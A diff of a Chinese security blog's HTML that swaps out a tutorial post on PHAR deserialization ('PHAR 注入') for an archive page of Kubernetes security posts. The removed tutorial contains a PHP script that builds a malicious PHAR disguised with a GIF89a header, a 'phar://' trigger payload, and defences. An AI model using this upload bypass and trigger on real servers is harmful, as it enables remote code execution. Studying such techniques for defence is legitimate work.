@@ -14,21 +14,17 @@
   
 
   
-  <title>PHAR 注入 | Licivo&#39;s Blog</title>
+  <title>归档: 2026/2 | Licivo&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
   <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
   <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
 
-  <meta name="description" content="PHAR 注入（也称为 PHAR 反序列化漏洞）是一种高级的 PHP 安全漏洞攻击技术。它的核心概念是：利用 PHP 的 phar:&#x2F;&#x2F; 伪协议在处理 PHAR 文件时，会自动反序列化其元数据（Metadata）的特性，从而在没有显式调用 unserialize() 函数的情况下，触发反序列化漏洞。 这通常被攻击者用来绕过代码审计，因为审计人员通常只盯着 unserialize() 找漏洞，而忽略">
-<meta property="og:type" content="article">
-<meta property="og:title" content="PHAR 注入">
-<meta property="og:url" content="http://example.com/2026/01/20/PHAR%20%E6%B3%A8%E5%85%A5/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Licivo&#39;s Blog">
+<meta property="og:url" content="http://example.com/archives/2026/02/index.html">
 <meta property="og:site_name" content="Licivo&#39;s Blog">
-<meta property="og:description" content="PHAR 注入（也称为 PHAR 反序列化漏洞）是一种高级的 PHP 安全漏洞攻击技术。它的核心概念是：利用 PHP 的 phar:&#x2F;&#x2F; 伪协议在处理 PHAR 文件时，会自动反序列化其元数据（Metadata）的特性，从而在没有显式调用 unserialize() 函数的情况下，触发反序列化漏洞。 这通常被攻击者用来绕过代码审计，因为审计人员通常只盯着 unserialize() 找漏洞，而忽略">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2026-01-20T06:20:52.001Z">
-<meta property="article:modified_time" content="2026-01-20T07:19:56.179Z">
 <meta property="article:author" content="Licivo">
 <meta name="twitter:card" content="summary">
   
@@ -228,208 +224,63 @@ document.addEventListener('keydown', function(e) {
     <div id="content-body">
        
 
-
-<article id="post-PHAR 注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  
-    
-   
-  <div class="article-inner">
-    <div class="article-main">
-      <header class="article-header">
-        
-<div class="main-title-bar">
-  <div class="main-title-dot"></div>
-  
-    
-      <h1 class="p-name article-title" itemprop="headline name">
-        PHAR 注入
-      </h1>
-    
-  
-</div>
-
-        <div class='meta-info-bar'>
-          <div class="meta-info">
-  <time class="dt-published" datetime="2026-01-20T06:20:52.001Z" itemprop="datePublished">2026-01-20</time>
-</div>
-          <div class="need-seperator meta-info">
-            <div class="meta-cate-flex">
-  
-  <a class="meta-cate-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
-   
-</div>
-  
-          </div>
-          <div class="wordcount need-seperator meta-info">
-            2.5k 词 
-          </div>
-
-          
-          <div class="need-seperator meta-info">
-            <i class="fa-solid fa-fire-flame-curved" style="color: #ff5722; margin-right: 8px;"></i>
-            <span id="busuanzi_container_page_pv" style="display: none;">
-              <span id="busuanzi_value_page_pv"></span>
-            </span>
-          </div>
-          
-        </div>
-        
-      </header>
-
-      <div class="e-content article-entry" itemprop="articleBody">
-        
-          <p><strong>PHAR 注入</strong>（也称为 <strong>PHAR 反序列化漏洞</strong>）是一种高级的 PHP 安全漏洞攻击技术。<br>它的核心概念是：<strong>利用 PHP 的 <code>phar://</code> 伪协议在处理 PHAR 文件时，会自动反序列化其元数据（Metadata）的特性，从而在没有显式调用 <code>unserialize()</code> 函数的情况下，触发反序列化漏洞。</strong></p>
-<p>这通常被攻击者用来绕过代码审计，因为审计人员通常只盯着 <code>unserialize()</code> 找漏洞，而忽略了文件操作函数（如 <code>file_exists</code>）。</p>
-<h1 id="1-什么是-PHAR-文件？"><a href="#1-什么是-PHAR-文件？" class="headerlink" title="1. 什么是 PHAR 文件？"></a>1. 什么是 PHAR 文件？</h1><p>PHAR (PHP Archive) 是 PHP 的一种归档文件格式（类似于 Java 的 JAR 包）。它允许将多个 PHP 文件、资源和配置打包成一个文件。</p>
-<p>一个标准的 PHAR 文件由四个部分组成：</p>
-<ol>
-<li><strong>Stub (存根)：</strong> PHAR 文件的头部标识。<strong>必须</strong>以 <code>__HALT_COMPILER();</code> 结尾。PHP 通过这个标识来识别这是不是一个 PHAR 文件。</li>
-<li><strong>Manifest (清单)：</strong> <strong>这是漏洞的关键</strong>。它包含了压缩文件的属性、权限等信息，以及<strong>用户自定义的元数据 (Metadata)</strong>。这些元数据是以 <strong>序列化 (Serialized)</strong> 的形式存储的。</li>
-<li><strong>File Contents (文件内容)：</strong> 被压缩的实际文件。</li>
-<li><strong>Signature (签名)：</strong> 文件完整性校验。</li>
-</ol>
-<h1 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2. 漏洞原理"></a>2. 漏洞原理</h1><p>PHAR 注入的魔力在于：<strong>只要 PHP 通过 <code>phar://</code> 协议解析一个 PHAR 文件，它就会强制将 Manifest 部分的 Metadata 进行反序列化。</strong></p>
-<p>这意味着，只要攻击者能控制任何一个<strong>文件操作函数</strong>的参数，并将其指向一个恶意的 PHAR 文件，就能触发反序列化攻击。</p>
-<p><strong>受影响的函数（不仅限于 <code>include</code>）：</strong> 这就大大扩展了攻击面。只要是涉及文件操作的函数，几乎都能触发：</p>
-<ul>
-<li><code>file_exists()</code></li>
-<li><code>is_dir()</code>, <code>is_file()</code></li>
-<li><code>file_get_contents()</code></li>
-<li><code>unlink()</code></li>
-<li><code>scandir()</code></li>
-<li><code>getimagesize()</code></li>
-</ul>
-<h2 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h2><table>
-<thead>
-<tr>
-<th><strong>功能场景</strong></th>
-<th><strong>可能的后端函数 (易受攻击)</strong></th>
-<th><strong>探测思路</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>头像&#x2F;图片预览</strong></td>
-<td><code>getimagesize()</code>, <code>exif_read_data()</code></td>
-<td>修改 <code>?img_path=</code> 或 <code>?file=</code> 参数，指向已上传的图片。</td>
-</tr>
-<tr>
-<td><strong>文件删除</strong></td>
-<td><code>unlink()</code></td>
-<td>这是一个绝佳的触发点。尝试删除自己的头像，但在路径处填入 <code>phar://...</code>。</td>
-</tr>
-<tr>
-<td><strong>文件是否存在</strong></td>
-<td><code>file_exists()</code>, <code>is_file()</code>, <code>is_dir()</code></td>
-<td>常见于“检查文件完整性”或加载静态资源的功能。</td>
-</tr>
-<tr>
-<td><strong>文件下载</strong></td>
-<td><code>file_get_contents()</code>, <code>readfile()</code>, <code>fopen()</code></td>
-<td>尝试读取文件时，利用 <code>phar://</code> 触发。</td>
-</tr>
-<tr>
-<td><strong>目录浏览</strong></td>
-<td><code>scandir()</code>, <code>opendir()</code>, <code>DirectoryIterator</code></td>
-<td>如果有列出目录文件的功能，尝试传入 PHAR 路径。</td>
-</tr>
-<tr>
-<td><strong>解析 XML&#x2F;压缩包</strong></td>
-<td><code>simplexml_load_file()</code>, <code>ZipArchive::open()</code></td>
-<td>某些特定格式解析库也支持流包装器。</td>
-</tr>
-<tr>
-<td><strong>数据库导入</strong></td>
-<td><code>LOAD DATA INFILE</code> (极少情况)</td>
-<td>虽然主要是 SQL 注入，但某些应用层封装可能涉及文件检查。</td>
-</tr>
-</tbody></table>
-<p>但是真实的环境下，类名通常未知，路径也未知</p>
-<h1 id="3-攻击流程"><a href="#3-攻击流程" class="headerlink" title="3. 攻击流程"></a>3. 攻击流程</h1><h2 id="第一步：构造恶意-PHAR-生成-Payload"><a href="#第一步：构造恶意-PHAR-生成-Payload" class="headerlink" title="第一步：构造恶意 PHAR (生成 Payload)"></a>第一步：构造恶意 PHAR (生成 Payload)</h2><p>攻击者在本地生成一个恶意的 PHAR 文件。这个文件会将一个带有恶意的对象序列化后写入 Metadata。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;whoami&#x27;</span>; <span class="comment">// 恶意命令</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exploit.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关键点：设置 Stub，必须以 __HALT_COMPILER(); 结尾</span></span><br><span class="line"><span class="comment">// 可以在前面伪造 GIF 头 (GIF89a) 来绕过文件上传检测</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关键点：将恶意对象放入 Metadata</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">// 添加随便什么文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="第二步：伪装与上传-Bypass-Upload-Filters"><a href="#第二步：伪装与上传-Bypass-Upload-Filters" class="headerlink" title="第二步：伪装与上传 (Bypass Upload Filters)"></a>第二步：伪装与上传 (Bypass Upload Filters)</h2><p>由于 PHAR 的识别只看 <code>__HALT_COMPILER();</code>，攻击者可以将 PHAR 后缀改为 <code>.jpg</code>、<code>.gif</code>，甚至在文件头加上图片标识（如 GIF89a）。</p>
-<ul>
-<li><strong>结果：</strong> 服务器认为这是张图片，允许上传。</li>
-</ul>
-<h2 id="第三步：触发漏洞-Trigger"><a href="#第三步：触发漏洞-Trigger" class="headerlink" title="第三步：触发漏洞 (Trigger)"></a>第三步：触发漏洞 (Trigger)</h2><p>攻击者找到一个控制文件路径的地方（例如 <code>is_file($_GET[&#39;path&#39;])</code>），并利用 <code>phar://</code> 协议指向刚才上传的文件。</p>
-<ul>
-<li><strong>Payload:</strong> <code>?path=phar://./uploads/exploit.jpg/test.txt</code> (或者直接指向文件本身，取决于具体函数)。</li>
-</ul>
-<p><strong>结果：</strong> PHP 解析 <code>phar://</code> -&gt; 读取 Metadata -&gt; <strong>自动反序列化</strong> -&gt; 触发 <code>Evil</code> 对象的 <code>__destruct()</code> -&gt; <strong>RCE (远程代码执行)</strong>。</p>
-<h1 id="4-如何防御？"><a href="#4-如何防御？" class="headerlink" title="4. 如何防御？"></a>4. 如何防御？</h1><ol>
-<li><p><strong>禁用 <code>phar://</code> 协议：</strong> 如果业务不需要，可以在 <code>php.ini</code> 中设置 <code>phar.readonly = On</code>（但这通常只阻止创建）。更好的方法是使用 <code>stream_wrapper_unregister(&#39;phar&#39;);</code> 在代码中彻底注销该协议。</p>
-</li>
-<li><p><strong>严格过滤输入路径：</strong> 检查用户输入的文件路径是否包含 <code>phar://</code>，或者直接限制只能包含 <code>http://</code> 或纯相对路径。</p>
-</li>
-<li><p><strong>文件上传检测：</strong> 不仅仅检测文件头和后缀，还应检测文件内容是否包含 <code>__HALT_COMPILER</code> 关键字。</p>
-</li>
-<li><p><strong>业务逻辑隔离：</strong> 确保 <code>file_exists</code> 等函数的参数完全不可控，或者经过 <code>basename()</code> 处理。</p>
-</li>
-</ol>
-
-          
-          <div style="margin-top: 50px;">
-            <script src="https://giscus.app/client.js"
-              data-repo="Licivo/Licivo.github.io"
-              data-repo-id="R_kgDOOQU8CQ"
-              data-category="Announcements"
-              data-category-id="DIC_kwDOOQU8Cc4C0Pub"
-              data-mapping="pathname"
-              data-strict="0"
-              data-reactions-enabled="1"
-              data-emit-metadata="0"
-              data-input-position="bottom"
-              data-theme="preferred_color_scheme"
-              data-lang="zh-CN"
-              crossorigin="anonymous"
-              async>
-            </script>
-          </div>
-        
-      </div>
-
-          
+<div class="archive-main-card">
+    <div class="archive-top">
+      <div class="main-title-bar">
+        <div class="main-title-dot"></div>
+        <h1 class="article-title">归档</h1>
+      </div>    
     </div>
     
-     
+    
+      
+      
+        
+        <div class="year-line">
+            <div class="year-num">2026</div>
+            <div class="dot-wrapper">
+                <div class="dot"></div>
+            </div>
+            <div class="article-count">2 篇文章</div>
+        </div>
+      
+      <a class="archive-article-link" href="/2026/02/06/k8s%20%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/" title="K8S 集群安全">
+        <div class="date">02-06</div>
+        <div class="line">
+            <div class="dot"></div>
+        </div>
+        <div class="title">
+            <div class="title-inner">
+                
+                    K8S 集群安全
+                
+            </div>
+        </div>
+        <div class="tags">
+            
+        </div>
+      </a>
+    
+      
+      
+      <a class="archive-article-link" href="/2026/02/06/kubernetes-goat/" title="kubernetes-goat">
+        <div class="date">02-06</div>
+        <div class="line">
+            <div class="dot"></div>
+        </div>
+        <div class="title">
+            <div class="title-inner">
+                
+                    kubernetes-goat
+                
+            </div>
+        </div>
+        <div class="tags">
+            
+        </div>
+      </a>
+    
   </div>
-  
-    
-<nav id="article-nav">
-  <a class="article-nav-btn left "
-    
-      href="/2026/01/21/ThinkPHP_5.0.23/"
-      title="ThinkPHP_5.0.23"
-     >
-    <i class="fa-solid fa-angle-left"></i>
-    <p class="title-text">
-      
-        ThinkPHP_5.0.23
-        
-    </p>
-  </a>
-  <a class="article-nav-btn right "
-    
-      href="/2026/01/15/CSRF%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"
-      title="CSRF 漏洞原理"
-     >
-
-    <p class="title-text">
-      
-        CSRF 漏洞原理
-        
-    </p>
-    <i class="fa-solid fa-angle-right"></i>
-  </a>
-</nav>
-
-
-  
-</article>
-
-
-
-
     </div>
     <div id="footer-wrapper">
       <footer id="footer">
